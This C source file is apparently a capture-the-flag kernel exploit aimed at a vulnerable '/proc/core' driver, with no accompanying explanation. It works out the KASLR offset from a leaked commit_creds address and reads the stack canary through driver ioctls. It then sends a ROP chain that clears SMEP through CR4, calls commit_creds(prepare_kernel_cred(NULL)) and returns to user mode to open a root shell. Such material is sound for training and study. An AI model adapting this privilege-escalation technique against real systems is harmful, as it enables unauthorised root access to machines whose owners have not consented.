// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#include <stddef.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN "\033[36m"
#define COLOR_RESET "\033[0m"
#define log(X)                                                                 \
  printf(COLOR_BLUE "[*] %s --> 0x%lx " COLOR_RESET "\n", (#X), (X))
#define success(X) printf(COLOR_GREEN "[+] %s" COLOR_RESET "\n", (X))
#define info(X) printf(COLOR_MAGENTA "[*] %s" COLOR_RESET "\n", (X))
#define errExit(X)                                                             \
  printf(COLOR_RED "[-] %s " COLOR_RESET "\n", (X));                           \
  exit(0)

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  info("Status has been saved.");
}

void get_shell(void) {
  info("Trying to get root shell.");
  if (getuid()) {
    errExit("Failed to get root shell.");
  }
  success("Successfully get root shell.");
  system("/bin/sh");
}

int fd;
size_t kaslr_offset;
size_t commit_creds_addr;
size_t prepare_kernel_addr;
size_t canary;

void leak_kbase() {
  info("Trying to leak kbase.");

  char temp_addr1[0x10];
  FILE *fp = fopen("/tmp/temp_addr", "r");
  fscanf(fp, "%s T commit_creds", temp_addr1);
  commit_creds_addr = strtoul(temp_addr1, NULL, 16);
  log(commit_creds_addr);

  kaslr_offset = commit_creds_addr - 0xffffffff8109c8e0;
  log(kaslr_offset);

  prepare_kernel_addr = kaslr_offset + 0xffffffff8109cce0;
}

void leak_canary() {
  info("Leak canary with global off.");

  fd = open("/proc/core", 2);
  char buf[0x40] = {0};
  ioctl(fd, 0x6677889C, 0x40);
  ioctl(fd, 0x6677889B, buf);

  canary = *(size_t *)buf;
  log(canary);
}

void get_root_shell() {
  void *(*p)(void *) = prepare_kernel_addr;
  int (*c)(void *) = commit_creds_addr;
  (*c)((*p)(NULL));
}

void kernel_rop() {
  info("Kernel rop.");

  size_t pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
  size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;
  size_t iretq = kaslr_offset + 0xffffffff81050ac2;
  size_t mov_rdi_rax_callrdx = kaslr_offset + 0xffffffff8106a6d2;
  size_t pop_rdx_ret = kaslr_offset + 0xffffffff810a0f49;
  size_t mov_cr4rdi_ret = kaslr_offset + 0xffffffff81075014;
  size_t swapgs_restore_regs_and_return_to_usermode =
      kaslr_offset + 0xffffffff81a008da;

  size_t buf[0x800] = {0};
  int i = 0x40 / 8;
  buf[i++] = canary;
  buf[i++] = 0xdeadbeef;

  buf[i++] = pop_rdi_ret;
  buf[i++] = 0x6f0;
  buf[i++] = mov_cr4rdi_ret;

  buf[i++] = (size_t)get_root_shell;

  /* buf[i++] = pop_rdi_ret; */
  /* buf[i++] = 0; */
  /* buf[i++] = prepare_kernel_addr; */
  /* buf[i++] = pop_rdx_ret; */
  /* buf[i++] = commit_creds_addr; */
  /* buf[i++] = mov_rdi_rax_callrdx; */

  buf[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
  buf[i++] = 0xdeadbeef;
  buf[i++] = 0xdeadbeef;

  /* buf[i++] = swapgs_popfq_ret; */
  /* buf[i++] = 0; */
  /* buf[i++] = iretq; */

  buf[i++] = (size_t)get_shell;
  buf[i++] = user_cs;
  buf[i++] = user_rflags;
  buf[i++] = user_sp;
  buf[i++] = user_ss;

  write(fd, buf, 0x800);
  ioctl(fd, 0x6677889A, 0xffffffffffff0000 | 0x100);
}

int main() {
  save_status();
  signal(SIGSEGV, get_shell);

  leak_kbase();
  leak_canary();

  kernel_rop();
  return 0;
}
